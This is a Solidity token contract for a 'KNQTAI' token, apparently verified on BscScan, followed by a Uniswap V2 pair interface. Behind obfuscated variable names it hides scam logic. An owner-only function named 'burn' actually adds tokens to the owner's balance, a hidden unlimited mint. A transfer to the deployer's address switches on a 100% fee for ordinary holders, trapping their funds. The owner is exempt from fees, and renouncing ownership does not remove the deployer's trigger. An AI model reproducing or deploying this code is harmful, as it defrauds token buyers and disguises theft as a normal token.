/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract KNQTFR {
string public  name = "KNQTAI";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  LgeKMW = 100000000000000000;
uint256 public  RKuvRx = 10000000000000000000000000000;
uint256 public  euSOxK = 10000000000000000;
string public  symbol = "KNQTAI";
uint256 public  zAKkmW = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  GfjMkY = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
mapping (address => uint256) public balanceOf;
address private  jqmYiP = address(0);
uint256 public  jUwPnq = 100000000000000000000000;
uint256 public constant scQIkG = 9+1;
address public  NIlCTq = address(0);
uint256 public  lGXnJM = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  xIbwSM = 10000000000000;
uint8 public constant decimals = 18;
address public  IcDIIF = address(0);
address public  TyxdGt = address(0);
address public  kyOKdl = address(0);
address public  ZmhGeR = address(0);
address public  EVChbl = address(0);
uint256 public  OJkTfi = 10000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
jqmYiP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "RCFIhp");
require(to != address(0), "RCFIhp");
require(amount <= balanceOf[from], "RCFIhp");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* scQIkG/xIbwSM ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==jqmYiP){
xIbwSM = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}


interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
   	function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function sync() external;
    function initialize(address, address) external;
}